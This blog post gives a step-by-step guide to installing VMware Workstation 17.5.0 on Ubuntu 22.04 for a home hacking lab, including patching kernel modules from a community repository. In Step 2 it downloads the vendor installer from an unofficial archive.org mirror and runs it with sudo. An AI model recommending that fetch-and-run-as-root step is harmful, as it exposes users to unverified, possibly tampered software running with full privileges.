<p>As a developer using a Debian-based <strong>Ubuntu</strong> machine, I‚Äôll walk you through how I set up <strong>VMware Workstation</strong> to create a secure and legal hacking lab on <strong>Ubuntu 22.04</strong>. (This method should also work for other Ubuntu versions with minor adjustments.)</p>

<hr />

<h2 id="-step-1-update-your-system">üîß Step 1: Update Your System</h2>

<p>Before starting, ensure your system is up-to-date:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt upgrade <span class="nt">-y</span>
</code></pre></div></div>

<hr />

<h2 id="-step-2-download-the-vmware-workstation-installer">üì• Step 2: Download the VMware Workstation Installer</h2>

<p>We‚Äôll be using <strong>VMware Workstation 17.5.0</strong> in this guide:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ~/Downloads
wget https://ia801608.us.archive.org/12/items/vmware-workstation-full-17.5.0-22583795.x-86-64-by-vmware.bundle/VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle
<span class="nb">chmod</span> +x VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle
<span class="nb">sudo</span> ./VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle
</code></pre></div></div>

<ul>
  <li>The installer is downloaded into the <code class="language-plaintext highlighter-rouge">Downloads</code> directory.</li>
  <li>We make the <code class="language-plaintext highlighter-rouge">.bundle</code> file executable.</li>
  <li>Then run it with <code class="language-plaintext highlighter-rouge">sudo</code> to begin installation.</li>
</ul>

<p>After installation, <strong>VMware Player</strong> and other components should be available.</p>

<hr />

<h2 id="Ô∏è-step-3-fixing-kernel-module-errors">‚ö†Ô∏è Step 3: Fixing Kernel Module Errors</h2>

<p>When running <code class="language-plaintext highlighter-rouge">vmplayer</code> for the first time, you may encounter errors related to missing kernel modules like <code class="language-plaintext highlighter-rouge">vmmon</code> or <code class="language-plaintext highlighter-rouge">vmnet</code>. These are required for VMware to work properly with the Linux kernel.</p>

<hr />

<h2 id="Ô∏è-step-4-install-required-tools--patch-modules">üõ†Ô∏è Step 4: Install Required Tools &amp; Patch Modules</h2>

<p>Install the necessary packages and build the missing modules using the community-maintained <code class="language-plaintext highlighter-rouge">vmware-host-modules</code> repository:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>build-essential linux-headers-<span class="si">$(</span><span class="nb">uname</span> <span class="nt">-r</span><span class="si">)</span>
<span class="nb">sudo </span>vmware-modconfig <span class="nt">--console</span> <span class="nt">--install-all</span>

git clone https://github.com/mkubecek/vmware-host-modules.git
<span class="nb">cd </span>vmware-host-modules
git checkout workstation-17.5.0
make
<span class="nb">sudo </span>make <span class="nb">install
sudo </span>systemctl restart vmware
</code></pre></div></div>

<ul>
  <li>This installs build tools and kernel headers.</li>
  <li>Rebuilds the required modules for VMware Workstation 17.5.0.</li>
  <li>Finally, restarts the VMware service.</li>
</ul>

<hr />

<h2 id="-youre-ready">‚úÖ You‚Äôre Ready!</h2>

<p>With this setup, you‚Äôre now ready to start building and experimenting with your own ethical hacking lab‚Äîright from your Ubuntu machine!</p>

<p>Feel free to fork or update this guide for newer versions or other distributions.</p>

<hr />

<p><strong>Happy hacking!</strong> üêßüíªüïµÔ∏è‚Äç‚ôÇÔ∏è</p>]]></content><author><name>Himangshu Pan</name></author><summary type="html"><![CDATA[üõ†Ô∏è Setting Up VMware Workstation on Ubuntu 22.04]]></summary></entry></feed>